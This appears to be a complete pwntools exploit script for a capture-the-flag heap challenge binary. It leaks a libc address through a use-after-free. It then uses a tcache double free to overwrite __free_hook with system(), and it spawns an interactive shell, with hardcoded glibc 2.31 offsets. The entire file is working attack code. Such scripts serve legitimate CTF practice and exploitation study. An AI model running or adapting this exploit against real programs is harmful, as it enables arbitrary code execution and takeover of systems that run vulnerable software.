#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./chal')
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

def add(idx, size): 
    sla("> \n", "1")
    sla("> \n",str(idx))
    sla("> \n",str(size))

def edit(idx, content):
    sla("> \n", "2")
    sla("> \n",str(idx))
    sl(content)

def show(idx):
    sla("> \n", "3")
    sla("> \n",str(idx))

def free(idx):
    sla("> \n", "4")
    sla("> \n",str(idx))


add(0, 0x18)
add(1, 0x808)
add(2, 0x18)

free(1)
show(1)

libc.base = u64(p.recv(8))-0x1ebbe0
log.critical(str(hex(libc.base)))

free_hook = libc.base+0x1eeb28
system = libc.base+0x55410
free(2)
edit(2,p64(0))
free(2)

gdb.attach(p)

edit(2,p64(free_hook-0x8))
add(3,0x18)
add(4,0x18)
edit(4,b"/bin/sh\0"+p64(system))

free(4)

p.interactive()
